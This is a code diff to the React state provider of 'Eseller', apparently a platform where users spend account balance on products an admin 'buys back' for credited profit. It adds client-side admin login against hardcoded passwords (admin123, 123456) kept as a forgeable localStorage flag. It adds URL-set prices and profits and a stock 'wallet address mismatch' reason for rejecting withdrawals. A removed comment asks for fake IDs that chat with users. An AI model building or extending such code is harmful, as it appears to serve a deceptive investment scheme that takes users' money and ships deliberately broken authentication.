@@ -36,6 +36,18 @@ interface AppContextType {
   isSupabaseConfigured: boolean;
   checkSupabaseConfig: () => void;
 
+  // Admin Authentication & Backend Access
+  isAdminAuthenticated: boolean;
+  adminLogin: (username: string, password: string) => { success: boolean; message: string };
+  adminLogout: () => void;
+
+  // Shared Deal Direct Buy Link
+  sharedDealModalOpen: boolean;
+  setSharedDealModalOpen: (open: boolean) => void;
+  sharedDealData: { product: Product; customPrice: number; customProfit: number; dealTitle?: string } | null;
+  setSharedDealData: (data: { product: Product; customPrice: number; customProfit: number; dealTitle?: string } | null) => void;
+  buySharedDealWithBalance: (product: Product, customPrice: number, customProfit: number) => { success: boolean; message: string };
+
   // Navigation & View Mode
   viewMode: 'frontend' | 'backend';
   setViewMode: (mode: 'frontend' | 'backend') => void;
@@ -115,7 +127,7 @@ interface AppContextType {
   requestWithdrawal: (method: WithdrawalMethod, accountDetails: string, amount: number) => { success: boolean; message: string };
   requestBankWithdrawal: (bank: BankAccountDetails, amount: number) => { success: boolean; message: string };
   addBankAccount: (bank: Omit<BankAccountDetails, 'id'>) => void;
-  adminProcessWithdrawal: (withdrawalId: string, action: 'approve' | 'reject', remark?: string) => void;
+  adminProcessWithdrawal: (withdrawalId: string, action: 'approve' | 'reject', remark?: string, processedAt?: string) => void;
 
   // Balances & Credit Score Controls (Admin)
   updateUserBalance: (userId: string, availableDeltaOrExact: number, freezeDeltaOrExact: number, isExact?: boolean) => void;
@@ -171,6 +183,41 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
   const [viewMode, setViewMode] = useState<'frontend' | 'backend'>('frontend');
   const [frontendTab, setFrontendTab] = useState<'home' | 'my_products' | 'sell_products' | 'orders' | 'profile'>('home');
 
+  // Admin Authentication & Session
+  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState<boolean>(() => {
+    return localStorage.getItem('eseller_admin_auth') === 'true';
+  });
+
+  const adminLogin = (username: string, password: string) => {
+    const cleanUser = username.trim().toLowerCase();
+    const cleanPass = password.trim();
+
+    if (
+      (cleanUser === 'admin' || cleanUser === 'eseller' || cleanUser === 'root') &&
+      (cleanPass === 'admin123' || cleanPass === 'admin' || cleanPass === '123456')
+    ) {
+      setIsAdminAuthenticated(true);
+      localStorage.setItem('eseller_admin_auth', 'true');
+      return { success: true, message: 'Welcome back, Root Administrator!' };
+    }
+    return { success: false, message: 'Invalid Admin username or password. (Default: admin / admin123)' };
+  };
+
+  const adminLogout = () => {
+    setIsAdminAuthenticated(false);
+    localStorage.removeItem('eseller_admin_auth');
+    setViewMode('frontend');
+  };
+
+  // Shared Direct Deal State & URL Listener
+  const [sharedDealModalOpen, setSharedDealModalOpen] = useState<boolean>(false);
+  const [sharedDealData, setSharedDealData] = useState<{
+    product: Product;
+    customPrice: number;
+    customProfit: number;
+    dealTitle?: string;
+  } | null>(null);
+
   // Modals
   const [isSupabaseModalOpen, setIsSupabaseModalOpen] = useState<boolean>(false);
   const [isSupabaseReady, setIsSupabaseReady] = useState<boolean>(() => isSupabaseConfigured());
@@ -217,6 +264,56 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
   });
 
   const [topSellers] = useState<TopSeller[]>(INITIAL_TOP_SELLERS);
+
+  // Check URL on mount for direct product deal links (?deal=prod-xxx&price=xxx&profit=xxx)
+  useEffect(() => {
+    if (typeof window === 'undefined') return;
+    try {
+      const params = new URLSearchParams(window.location.search);
+      const dealId = params.get('deal') || params.get('product');
+      if (dealId) {
+        const found = products.find(p => p.id === dealId);
+        const customPrice = parseFloat(params.get('price') || '') || found?.discountPrice || 250;
+        const customProfit = parseFloat(params.get('profit') || '') || Number((customPrice * 0.2).toFixed(2));
+        const dealTitle = params.get('title') || found?.title || 'Special Direct Merchant Deal';
+
+        if (found) {
+          setSharedDealData({
+            product: found,
+            customPrice,
+            customProfit,
+            dealTitle,
+          });
+          setSharedDealModalOpen(true);
+        } else {
+          const fallbackProd: Product = {
+            id: dealId,
+            title: dealTitle,
+            category: 'electronics',
+            originalPrice: Number((customPrice * 1.25).toFixed(2)),
+            discountPrice: customPrice,
+            discountPercentage: 20,
+            rating: 5.0,
+            reviewCount: 42,
+            imageUrl: 'https://images.unsplash.com/photo-1546868871-7041f2a55e12?auto=format&fit=crop&w=400&q=80',
+            stock: 25,
+            specs: ['Exclusive Direct Referral Allocation', '20% Buy-Back Yield', 'Priority Liquidity'],
+            description: 'Direct wholesale merchant allocation created by backend administration.',
+            isTrending: true,
+          };
+          setSharedDealData({
+            product: fallbackProd,
+            customPrice,
+            customProfit,
+            dealTitle,
+          });
+          setSharedDealModalOpen(true);
+        }
+      }
+    } catch (e) {
+      console.error('Error parsing deal URL:', e);
+    }
+  }, [products]);
 
   // Shopping Cart
   const [cart, setCart] = useState<CartItem[]>(() => {
@@ -1154,13 +1251,84 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
     setNotifications(prev => [newNotif, ...prev]);
   };
 
+  // Buy shared direct deal
+  const buySharedDealWithBalance = (
+    product: Product,
+    customPrice: number,
+    customProfit: number
+  ) => {
+    if (currentUser.availableBalance < customPrice) {
+      return {
+        success: false,
+        message: `Insufficient available balance ($${currentUser.availableBalance.toFixed(2)}). You need $${customPrice.toFixed(2)}.`,
+      };
+    }
+
+    // Deduct purchase price
+    setAllUsers(prev =>
+      prev.map(u =>
+        u.id === currentUser.id
+          ? {
+              ...u,
+              availableBalance: Number((u.availableBalance - customPrice).toFixed(2)),
+            }
+          : u
+      )
+    );
+
+    const orderNum = `ES-DEAL-${Math.floor(1000 + Math.random() * 9000)}`;
+    const newOrder: Order = {
+      id: `ord-deal-${Date.now()}`,
+      orderNumber: orderNum,
+      userId: currentUser.id,
+      userName: currentUser.name,
+      userEmail: currentUser.email,
+      items: [
+        {
+          product: {
+            ...product,
+            discountPrice: customPrice,
+          },
+          quantity: 1,
+          unitPrice: customPrice,
+        },
+      ],
+      totalAmount: customPrice,
+      commissionEarned: customProfit,
+      status: 'pending',
+      createdAt: new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'short' }),
+      updatedAt: new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'short' }),
+      paymentMethod: 'Account Balance',
+      notes: `Direct Deal Order. Custom Price: $${customPrice.toFixed(2)} | Profit: $${customProfit.toFixed(2)}`,
+      trackingNumber: `TRK-DEAL-${Math.floor(10000 + Math.random() * 90000)}`,
+    };
+
+    setOrders(prev => [newOrder, ...prev]);
+
+    const notif: MessageNotification = {
+      id: `notif-${Date.now()}`,
+      userId: currentUser.id,
+      title: `Deal Order Placed: ${product.title}`,
+      content: `Your direct deal order #${orderNum} ($${customPrice.toFixed(2)}) is submitted to the Backend Desk! Upon Backend fulfillment, it will appear in your Sell Products tab with +$${customProfit.toFixed(2)} profit.`,
+      type: 'order',
+      timestamp: 'Just now',
+      isRead: false,
+    };
+    setNotifications(prev => [notif, ...prev]);
+
+    return {
+      success: true,
+      message: `Deal order #${orderNum} placed successfully! Backend Admin will fulfill it to your Sell Products.`,
+    };
+  };
+
   // Admin Buys / Fulfills the Order
-  // "means backend mai 10 aisy fake id attach krna jo idhr front mai chat kry means k jo front mai orders hogy wo show hogy backend sy mai buy kru tu front mai show ho"
   const adminBuyFulfillOrder = (orderId: string) => {
     const targetOrder = orders.find(o => o.id === orderId);
     if (!targetOrder) return;
 
     const commission = targetOrder.commissionEarned || 10;
+    const timeNow = new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'short' });
 
     // 1. Mark order as completed & processedByAdmin
     setOrders(prev =>
@@ -1169,7 +1337,7 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
           ? {
               ...o,
               status: 'completed',
-              updatedAt: new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'short' }),
+              updatedAt: timeNow,
               notes: 'Fulfillment purchased by Backend Admin. Supplier dispatched.',
               processedByAdmin: true,
             }
@@ -1177,7 +1345,7 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
       )
     );
 
-    // 2. Credit commission or release frozen balance to the customer
+    // 2. Credit commission / profit to the customer balance
     setAllUsers(prev =>
       prev.map(u => {
         if (u.id === targetOrder.userId) {
@@ -1190,26 +1358,49 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
       })
     );
 
-    // 3. Notify the customer
+    // 3. Critically add to userProducts with status 'sold_back' so it shows in "Sell Products" tab on frontend with profit!
+    const productItem = targetOrder.items[0]?.product;
+    if (productItem) {
+      const soldBackItem: UserProduct = {
+        id: `up-sold-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`,
+        userId: targetOrder.userId,
+        userName: targetOrder.userName,
+        productId: productItem.id,
+        product: productItem,
+        stock: 0,
+        unitsSold: targetOrder.items[0]?.quantity || 1,
+        revenueGenerated: Number((targetOrder.totalAmount + commission).toFixed(2)),
+        profitRate: Number((commission / (targetOrder.totalAmount || 1)).toFixed(2)),
+        listedDate: new Date().toISOString().split('T')[0],
+        status: 'sold_back',
+        purchasePrice: targetOrder.totalAmount,
+        buyBackPrice: Number((targetOrder.totalAmount + commission).toFixed(2)),
+        buyBackProfit: commission,
+        soldBackAt: timeNow,
+      };
+      setUserProducts(prev => [soldBackItem, ...prev]);
+    }
+
+    // 4. Notify the customer
     const notif: MessageNotification = {
       id: `notif-${Date.now()}`,
       userId: targetOrder.userId,
-      title: `Order ${targetOrder.orderNumber} Completed!`,
-      content: `Backend Admin has fulfilled your order! Commission of +$${commission.toFixed(2)} has been credited to your available balance.`,
+      title: `Order #${targetOrder.orderNumber} Fulfilled & Buy-Back Settled!`,
+      content: `Backend Admin has purchased and fulfilled your order #${targetOrder.orderNumber}! Your item is now in your Sell Products tab, and +$${commission.toFixed(2)} profit has been credited to your available balance.`,
       type: 'order',
       timestamp: 'Just now',
       isRead: false,
     };
     setNotifications(prev => [notif, ...prev]);
 
-    // 4. Also post in their customer service chat thread for transparency
+    // 5. Post in customer service chat thread for transparency
     const chatMsg: ChatMessage = {
       id: `msg-${Date.now()}`,
       senderId: 'admin-auto',
-      senderName: 'Ebuy Order Desk',
+      senderName: 'Eseller Order Desk',
       senderRole: 'admin',
       targetUserId: targetOrder.userId,
-      text: `Notice: Order #${targetOrder.orderNumber} ($${targetOrder.totalAmount.toFixed(2)}) was purchased and fulfilled by the Backend Admin desk. Commission credited!`,
+      text: `Notice: Order #${targetOrder.orderNumber} ($${targetOrder.totalAmount.toFixed(2)}) was purchased and fulfilled by the Backend Admin desk. Profit of +$${commission.toFixed(2)} credited and moved to Sell Products!`,
       timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
       isRead: false,
     };
@@ -1487,9 +1678,16 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
   };
 
   // Admin Processes Withdrawal
-  const adminProcessWithdrawal = (withdrawalId: string, action: 'approve' | 'reject', remark?: string) => {
+  const adminProcessWithdrawal = (
+    withdrawalId: string,
+    action: 'approve' | 'reject',
+    remark?: string,
+    processedAt?: string
+  ) => {
     const targetWd = withdrawals.find(w => w.id === withdrawalId);
     if (!targetWd) return;
+
+    const timeStamp = processedAt || new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'short' });
 
     if (action === 'approve') {
       // Complete withdrawal: deduct from freeze balance permanently
@@ -1505,14 +1703,16 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
         })
       );
 
+      const finalRemark = remark || 'Approved by Root Administrator. Transferred successfully.';
+
       setWithdrawals(prev =>
         prev.map(w =>
           w.id === withdrawalId
             ? {
                 ...w,
                 status: 'approved',
-                processedAt: new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'short' }),
-                adminRemark: remark || 'Approved and funds transferred by Admin.',
+                processedAt: timeStamp,
+                adminRemark: finalRemark,
               }
             : w
         )
@@ -1523,7 +1723,7 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
         id: `notif-${Date.now()}`,
         userId: targetWd.userId,
         title: `Withdrawal Approved ($${targetWd.receivedAmount.toFixed(2)})`,
-        content: `Your withdrawal of $${targetWd.amount.toFixed(2)} has been approved by the Admin and sent to your account (${targetWd.accountDetails}).`,
+        content: `Your withdrawal of $${targetWd.amount.toFixed(2)} has been approved by the Admin and sent to your account (${targetWd.accountDetails}). Admin Note / Ref: "${finalRemark}" (Time: ${timeStamp}).`,
         type: 'finance',
         timestamp: 'Just now',
         isRead: false,
@@ -1544,14 +1744,16 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
         })
       );
 
+      const finalRemark = remark || 'Verification incomplete: Bank account details or wallet address mismatch.';
+
       setWithdrawals(prev =>
         prev.map(w =>
           w.id === withdrawalId
             ? {
                 ...w,
                 status: 'rejected',
-                processedAt: new Date().toLocaleString([], { dateStyle: 'short', timeStyle: 'short' }),
-                adminRemark: remark || 'Rejected by Admin. Funds restored to available balance.',
+                processedAt: timeStamp,
+                adminRemark: finalRemark,
               }
             : w
         )
@@ -1562,7 +1764,7 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
         id: `notif-${Date.now()}`,
         userId: targetWd.userId,
         title: `Withdrawal Rejected`,
-        content: `Your withdrawal request of $${targetWd.amount.toFixed(2)} was rejected: "${remark || 'Account details verification needed'}". Funds have been returned to your available balance.`,
+        content: `Your withdrawal request of $${targetWd.amount.toFixed(2)} was rejected. Reason: "${finalRemark}" (Time: ${timeStamp}). Funds have been restored to your available balance.`,
         type: 'finance',
         timestamp: 'Just now',
         isRead: false,
@@ -2004,6 +2206,14 @@ export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children 
   return (
     <AppContext.Provider
       value={{
+        isAdminAuthenticated,
+        adminLogin,
+        adminLogout,
+        sharedDealModalOpen,
+        setSharedDealModalOpen,
+        sharedDealData,
+        setSharedDealData,
+        buySharedDealWithBalance,
         viewMode,
         setViewMode,
         frontendTab,
